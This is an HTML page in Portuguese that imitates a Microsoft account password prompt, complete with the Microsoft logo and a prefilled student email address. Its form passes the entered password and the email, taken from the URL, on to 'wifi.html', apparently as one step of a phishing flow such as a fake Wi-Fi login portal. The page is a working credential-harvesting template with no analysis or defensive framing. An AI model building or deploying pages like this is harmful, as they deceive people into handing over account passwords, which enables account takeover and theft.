<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <title>Insira a senha</title>
    <link rel="stylesheet" href="styles.css">
</head>

<body>
    <div class="card-box">
        <div class="ms-logo">
            <div class="ms-squares">
                <div class="sq-red"></div>
                <div class="sq-green"></div>
                <div class="sq-blue"></div>
                <div class="sq-yellow"></div>
            </div>
            Microsoft
        </div>
        <p style="font-size: 13px; margin-bottom: 8px;">← pedro.andrade@alunos.afya.com.br</p>
        <h2 class="card-title">Insira a senha</h2>

        <form action="wifi.html" method="GET">

            <input type="password" class="input-field" name="senha" placeholder="Senha"
                style="border-bottom: 1px solid #0067b8; border-top:none; border-left:none; border-right:none; border-radius:0;"
                required>
            <input type="hidden" name="email" id="emailHidden">
            <br>
            <a href="#" class="link-action">Esqueci minha senha</a>
            <br><br>
            <button type="submit" class="btn-primary">Entrar</button>
        </form>

    </div>

    <script>
        const params = new URLSearchParams(window.location.search);
        const email = params.get("email");

        document.getElementById("emailHidden").value = email;
    </script>
</body>

</html>
